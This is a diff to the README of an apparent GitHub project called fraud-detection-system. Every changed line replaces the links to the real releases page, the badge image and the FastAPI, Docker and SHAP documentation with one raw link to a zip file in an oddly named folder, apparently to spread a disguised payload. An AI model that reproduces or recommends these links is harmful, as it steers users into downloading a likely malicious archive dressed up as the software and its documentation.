@@ -1,6 +1,6 @@
 # 🚀 fraud-detection-system - Easy Real-Time Fraud Detection
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/luisgamer05/fraud-detection-system/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip)
 
 ## 📌 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to get started with the fraud detection system:
 
 To get the latest version of the fraud-detection-system, please visit the following link:
 
-[Download Here](https://github.com/luisgamer05/fraud-detection-system/releases)
+[Download Here](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip)
 
 ### 2. 🛠️ System Requirements
 
@@ -37,7 +37,7 @@ Before downloading, ensure your system meets these requirements:
 
 Return to this link to download the latest version:
 
-[Download Here](https://github.com/luisgamer05/fraud-detection-system/releases)
+[Download Here](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip)
 
 1. **Choose the appropriate file** for your operating system.
 2. **Start the download.**
@@ -96,8 +96,8 @@ This project is licensed under the MIT License. For more details, please see the
 
 ## 🔗 Additional Resources
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Docker Documentation](https://docs.docker.com/get-started/)
-- [SHAP Documentation](https://shap.readthedocs.io/en/latest/)
+- [FastAPI Documentation](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip)
+- [SHAP Documentation](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/luisgamer05/fraud-detection-system/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/luisgamer05/fraud-detection-system/main/thalamiflorous/fraud-detection-system.zip)
